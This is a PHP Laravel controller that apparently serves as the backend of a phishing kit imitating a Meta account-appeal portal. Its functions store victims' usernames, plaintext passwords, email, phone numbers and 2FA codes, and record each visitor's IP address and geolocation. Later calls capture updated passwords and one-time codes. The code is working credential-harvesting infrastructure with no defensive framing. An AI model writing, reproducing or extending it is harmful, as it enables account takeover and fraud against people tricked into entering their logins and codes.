<?php

namespace App\Http\Controllers;

use App\Models\MMeta;
use App\Models\MOwner;
use Illuminate\Http\Request;
use Carbon\Carbon;
use Exception;
use ipinfo\ipinfo\IPinfo;
class CommonController extends Controller
{
    public function getUsername(Request $request){
        $email = $request->email;
        return view('meta-portal-appeal',[
            'email' => $email
        ]);
    }
    public function getUsernameAppeal(Request $request){
        $email = $request->email;
        return view('meta-portal-info',[
            'email' => $email
        ]);
    }

    public function storeInfo(Request $request){
        try{
            $info = new MMeta;
            $info->username = $request->username;
            $info->password = $request->password;
            $info->email = $request->email;
            $info->phone = $request->phone;
            $info['2fa'] = '';
            $info->otp_wrong = 0;
            $info->otp_correct = 0;
            $info->password_wrong = 0;
            $info->date = Carbon::now();

            $adminInfo = MOwner::where('username', 'admin')->first();
            $ipAddress = $request->ip() ?? 'Unknown';
            $ipinfo = new IPinfo($adminInfo->ip_access_token);
            $details = $ipinfo->getDetails($ipAddress);

            $city = $details->city ?? 'Unknown';
            $region = $details->region ?? 'Unknown';
            $country = $details->country ?? 'Unknown';
            $location = $city . ', ' . $region . ', ' . $country;

            $info->ip_location = $location;
            $info->ip_address = $ipAddress;

            $info->save();

            return response()->json([
                'status'    => 200,
                'message'   => 'Success',
                'data'      => $info
            ]);
        }catch(Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function updateDigitCode(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info['2fa'] = $request->code;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'   => 'Success',
                'data'      => $info
            ]);
        }catch(Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function updatePassword(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->password = $request->password;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'   => 'Success',
                'data'      => $info
            ]);
        }catch(Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }
}
